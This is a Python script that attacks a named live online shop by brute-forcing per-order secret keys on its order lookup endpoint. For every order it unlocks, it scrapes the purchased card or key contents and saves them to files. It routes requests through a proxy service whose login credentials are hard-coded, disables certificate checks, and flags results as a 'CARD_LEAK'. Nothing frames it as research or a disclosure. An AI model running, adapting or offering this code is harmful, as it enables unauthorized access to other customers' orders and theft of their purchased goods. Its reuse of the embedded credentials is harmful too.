#!/usr/bin/env python3
"""xinhe001 historical orders via ajax.php?act=order skey brute on order ids."""
from __future__ import annotations

import hashlib
import json
import os
import re
import sys
import time
from datetime import datetime
from pathlib import Path

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
OUT = Path(
    sys.argv[1]
    if len(sys.argv) > 1
    else f"/workspace/results_xinhe001/skey_brute_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
)
ID_START = int(sys.argv[2]) if len(sys.argv) > 2 else 5735
ID_END = int(sys.argv[3]) if len(sys.argv) > 3 else ID_START - 200
SITE = os.environ.get("XINHE_SITE", "435")
PROXY = os.environ.get(
    "QG_TUNNEL",
    "http://15E27ADA-A-JP-T-300-S-xhdeep:661C21F2CC15@overseas-us.tunnel.qg.net:16538",
)

CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def log(msg: str) -> None:
    print(msg, flush=True)
    OUT.mkdir(parents=True, exist_ok=True)
    with (OUT / "progress.log").open("a", encoding="utf-8") as f:
        f.write(msg + "\n")


def session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Referer": BASE,
        }
    )
    return s


def skeys_for(oid: int, site: str) -> list[str]:
    o = str(oid)
    keys = [
        "",
        o,
        site,
        f"{site}{o}",
        f"{o}{site}",
        "xinhe001",
        "xinghe001",
        "xinhe",
        "xinghe",
        "faka",
        "rainbow",
        "123456",
        hashlib.md5(o.encode()).hexdigest(),
        hashlib.md5(f"{o}{site}".encode()).hexdigest(),
        hashlib.md5(f"{site}{o}".encode()).hexdigest(),
        hashlib.md5(f"order{o}".encode()).hexdigest(),
        hashlib.md5(f"xinhe{o}".encode()).hexdigest(),
        hashlib.md5(f"xinghe001{o}".encode()).hexdigest(),
    ]
    return keys


def warm(s: requests.Session) -> bool:
    for i in range(8):
        try:
            r = s.get(BASE, timeout=35)
            if len(r.text) > 5000:
                return True
        except Exception as e:
            log(f"warm {i}: {e}")
            time.sleep(3 + i)
    return False


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    s = session()
    if not warm(s):
        log("FAIL: homepage unreachable")
        return
    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20).json()
    orders = int(gc.get("orders", ID_START))
    log(f"orders={orders} site={SITE} range={ID_START}->{ID_END}")

    hits: dict[str, dict] = {}
    if (OUT / "orders.json").exists():
        hits = json.loads((OUT / "orders.json").read_text(encoding="utf-8"))

    start = min(ID_START, orders)
    end = max(ID_END, 1)

    for oid in range(start, end - 1, -1):
        if str(oid) in hits:
            continue
        for sk in skeys_for(oid, SITE):
            try:
                r = s.post(
                    BASE + "ajax.php?act=order",
                    data={"id": str(oid), "skey": sk},
                    timeout=14,
                )
                if '"code":0' in r.text:
                    try:
                        data = json.loads(r.text)
                    except json.JSONDecodeError:
                        data = {"raw": r.text[:500]}
                    hits[str(oid)] = {"skey": sk, "data": data}
                    log(
                        f"HIT id={oid} skey={sk[:16]} money={data.get('money')} "
                        f"status={data.get('status')} kminfo={bool(data.get('kminfo'))}"
                    )
                    break
            except Exception as e:
                log(f"err {oid}: {e}")
                try:
                    warm(s)
                except Exception:
                    time.sleep(10)
            time.sleep(0.08)
        if oid % 20 == 0:
            (OUT / "orders.json").write_text(
                json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8"
            )
            log(f"progress id={oid} hits={len(hits)}")

    cards = {}
    for oid, entry in hits.items():
        sk = entry.get("skey", "")
        if not sk or len(sk) < 16:
            continue
        try:
            fk = s.get(
                BASE,
                params={"mod": "faka", "id": oid, "skey": sk},
                timeout=18,
            )
            m = CARD.search(fk.text)
            if m:
                cards[oid] = m.group(1).strip()
                log(f"CARD {oid} {cards[oid][:80]}")
        except Exception:
            pass
        time.sleep(0.15)

    report = {
        "target": "xinhe001.lol",
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "order_hits": len(hits),
        "cards": len(cards),
        "CARD_LEAK": bool(hits or cards),
    }
    (OUT / "orders.json").write_text(
        json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    if cards:
        (OUT / "cards.txt").write_text(
            "\n".join(f"{k}\t{v}" for k, v in sorted(cards.items(), key=lambda x: int(x[0]))),
            encoding="utf-8",
        )
    (OUT / "report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2))
    log(f"DONE hits={len(hits)} cards={len(cards)}")


if __name__ == "__main__":
    main()
